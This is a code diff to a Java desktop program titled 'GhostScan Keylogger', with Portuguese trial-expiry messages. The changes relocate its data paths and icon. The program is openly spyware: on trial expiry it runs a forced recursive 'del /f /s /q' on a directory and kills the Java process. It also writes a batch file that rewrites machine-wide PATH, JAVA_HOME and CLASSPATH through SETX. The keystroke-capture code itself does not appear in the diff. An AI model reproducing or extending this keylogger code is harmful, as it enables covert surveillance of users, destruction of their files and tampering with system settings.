@@ -4,7 +4,9 @@ import java.awt.AWTException;
 import java.awt.Color;
 import java.awt.Font;
 import java.awt.Frame;
+import java.awt.Image;
 import java.awt.Robot;
+import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.event.InputEvent;
@@ -19,6 +21,8 @@ import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
+import java.net.URL;
+
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JCheckBox;
@@ -133,7 +137,7 @@ public class GhostScan extends JFrame{
 				Writerx.close();
 			} catch (IOException e) {}
 			Thread.sleep(10000);
-			Runtime.getRuntime().exec("CMD /c del C:\\keylog\\*.* /f /s /q");
+			Runtime.getRuntime().exec("CMD /c del "+getPath+"\\*.* /f /s /q");
 			Runtime.getRuntime().exec("CMD /c taskkill /f /im javaw.exe");
 		}else{
 			JOptionPane.showMessageDialog(null, "<html><font color='red'>Atenção!Como esta é a versão pra teste, você tem apenas "+q+" dias pra usar o programa!<br>"
@@ -185,9 +189,9 @@ public class GhostScan extends JFrame{
 		PrintWriter printConfig;
 		
 		try {
-			printConfig = new PrintWriter(new File("C:/keylog/config.bat"));
+			printConfig = new PrintWriter(new File("config.bat"));
 			printConfig.println("@echo off");
-			printConfig.println("echo 0b030g1 > C:\\keylog\\arquivo.gs");
+			printConfig.println("echo 0b030g1 > arquivo.gs");
 			printConfig.println("SETX JAVA_HOME "+'"'+memory1+'"'+" -m");
 			printConfig.println("SETX PATH "+'"'+";"+memory1+"\\bin;C:;C:\\WINDOWS;C:\\WINDOWS\\system32"+'"'+" -m");
 			printConfig.println("SETX CLASSPATH "+'"'+";"+memory1+"\\lib;"+memory1+"\\lib\\tools.jar;"+memory1+"\\lib\\dt.jar;"+memory1+"\\lib\\htmlconverter.jar;"+memory1+"\\jre\\lib;"+memory1+"\\jre\\lib\\rt.jar;"+'"'+" -m");
@@ -198,7 +202,7 @@ public class GhostScan extends JFrame{
 			e.printStackTrace();
 		}
 		
-		String openConfig = "CMD /c C:\\keylog\\configInit.lnk";
+		String openConfig = "CMD /c configInit.lnk";
 		
 		
 		
@@ -215,7 +219,7 @@ public class GhostScan extends JFrame{
 		}
 		
 		String line = "";
-		File file1 = new File("C:\\keylog\\arquivo.gs");
+		File file1 = new File("C:\\GhostScan\\arquivo.gs");
 		FileReader reader;
 		try {
 			reader = new FileReader(file1);
@@ -238,7 +242,7 @@ public class GhostScan extends JFrame{
 		/*}
 		
 		try {
-			FileWriter writ = new FileWriter("C:\\keylog\\arquivo.gs");
+			FileWriter writ = new FileWriter("C:\\GhostScan\\arquivo.gs");
 			writ.write("0b130g0");
 			writ.close();
 		} catch (IOException e) {
@@ -272,17 +276,11 @@ public class GhostScan extends JFrame{
 		this.setBounds(350, 150, 500, 500);
 		this.setTitle("GhostScan Keylogger");
 		
+		
 		ImageIcon icon;
-		
-		if(pathStr.contains("/prog/spyware")){
-			icon = new ImageIcon(getClass().getResource("/image/scan.jpg"));
-			this.setIconImage(icon.getImage());
-		}else{
-			
-			icon = new ImageIcon("/image/scan.jpg");
-			this.setIconImage(icon.getImage());
-		}
-		
+		icon = new ImageIcon(getClass().getResource("/image/scan.png"));
+		this.setIconImage(icon.getImage());
+	
 		
 		
 		
